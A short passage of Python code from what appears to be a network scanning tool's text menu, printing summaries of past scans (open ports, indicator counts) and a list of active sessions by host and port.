                print(f"  {i}. {scan['target']} — "
                      f"{len(scan.get('open_ports', []))} open, "
                      f"{bds} indicators ({high} high) — "
                      f"{scan['scan_time'][:19]}")

        elif choice == '5':
            sessions = svc.list_sessions()
            if not sessions:
                print("\n  No active sessions.")
                continue
            print(f"\n  Active Sessions ({len(sessions)}):")
            for s in sessions:
                print(f"  {s['session_id']} — {s['type']} → "
                      f"{s['host']}:{s['port']} "
                      f"(since {s['connected_at'][:19]})")
